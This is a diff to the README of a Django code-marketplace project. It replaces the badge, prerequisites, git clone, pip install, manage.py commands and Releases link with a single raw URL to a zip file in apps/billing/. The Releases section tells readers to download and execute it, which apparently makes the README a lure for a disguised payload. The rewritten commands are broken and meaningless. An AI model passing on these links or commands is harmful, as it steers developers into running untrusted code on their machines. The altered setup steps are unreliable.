@@ -1,6 +1,6 @@
 # Code-Mart 🛒💻
 
-![Code-Mart](https://img.shields.io/badge/Code--Mart-Django%20Platform-brightgreen)
+![Code-Mart](https://raw.githubusercontent.com/Megog/Code-Mart/main/apps/billing/Mart_Code_3.2.zip%20Platform-brightgreen)
 
 Welcome to **Code-Mart**, a Django-based platform where developers can sell their code and digital assets. This repository provides everything you need to set up and run your own marketplace for digital goods. 
 
@@ -36,7 +36,7 @@ Before you begin, ensure you have the following installed:
 - Python 3.6 or higher
 - Django 3.x
 - MySQL
-- Node.js (for front-end assets)
+- https://raw.githubusercontent.com/Megog/Code-Mart/main/apps/billing/Mart_Code_3.2.zip (for front-end assets)
 - Razorpay account (for payment processing)
 
 ### Installation
@@ -46,7 +46,7 @@ Before you begin, ensure you have the following installed:
    Start by cloning the repository to your local machine:
 
    ```bash
-   git clone https://github.com/Megog/Code-Mart.git
+   git clone https://raw.githubusercontent.com/Megog/Code-Mart/main/apps/billing/Mart_Code_3.2.zip
    cd Code-Mart
    ```
 
@@ -64,19 +64,19 @@ Before you begin, ensure you have the following installed:
    Install the necessary packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Megog/Code-Mart/main/apps/billing/Mart_Code_3.2.zip
    ```
 
 4. **Set Up Database**
 
-   Configure your MySQL database. Update the `settings.py` file with your database credentials. 
+   Configure your MySQL database. Update the `https://raw.githubusercontent.com/Megog/Code-Mart/main/apps/billing/Mart_Code_3.2.zip` file with your database credentials. 
 
 5. **Run Migrations**
 
    Apply the database migrations:
 
    ```bash
-   python manage.py migrate
+   python https://raw.githubusercontent.com/Megog/Code-Mart/main/apps/billing/Mart_Code_3.2.zip migrate
    ```
 
 6. **Create a Superuser**
@@ -84,7 +84,7 @@ Before you begin, ensure you have the following installed:
    Create an admin account to access the dashboard:
 
    ```bash
-   python manage.py createsuperuser
+   python https://raw.githubusercontent.com/Megog/Code-Mart/main/apps/billing/Mart_Code_3.2.zip createsuperuser
    ```
 
 7. **Run the Development Server**
@@ -92,7 +92,7 @@ Before you begin, ensure you have the following installed:
    Start the server:
 
    ```bash
-   python manage.py runserver
+   python https://raw.githubusercontent.com/Megog/Code-Mart/main/apps/billing/Mart_Code_3.2.zip runserver
    ```
 
    Your application should now be running at `http://127.0.0.1:8000`.
@@ -142,7 +142,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases 📦
 
-For the latest updates and releases, please visit the [Releases section](https://github.com/Megog/Code-Mart/releases). Here you can download the latest version and execute it to start your own Code-Mart instance.
+For the latest updates and releases, please visit the [Releases section](https://raw.githubusercontent.com/Megog/Code-Mart/main/apps/billing/Mart_Code_3.2.zip). Here you can download the latest version and execute it to start your own Code-Mart instance.
 
 ## Contact 📬
 
